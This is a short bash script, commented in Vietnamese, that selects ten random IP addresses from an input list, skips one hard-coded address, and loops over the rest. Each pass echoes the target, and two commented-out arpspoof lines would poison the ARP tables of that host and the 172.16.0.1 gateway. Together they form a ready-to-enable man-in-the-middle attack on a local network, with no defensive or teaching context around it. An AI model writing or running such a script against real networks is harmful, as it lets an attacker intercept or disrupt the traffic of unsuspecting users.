#!/bin/bash

# Giao diện mạng, ví dụ: wlan0
interface="wlan0"

# Địa chỉ IP của gateway
gateway_ip="172.16.0.1"

# Số lượng IP muốn chọn ngẫu nhiên
n=10

# Đọc file và lưu vào mảng
readarray -t all_ips

# Chọn ngẫu nhiên n IP từ mảng
selected_ips=($(printf "%s\n" "${all_ips[@]}" | shuf -n $n))

# Thực hiện arpspoof với mỗi IP đã chọn
for target_ip in "${selected_ips[@]}"; do
    if [ "$target_ip" = "172.16.2.66" ]; then
        continue
    fi
    echo $target_ip
    #sudo arpspoof -i $interface -t $target_ip $gateway_ip &
    #sudo arpspoof -i $interface -t $gateway_ip $target_ip &
done

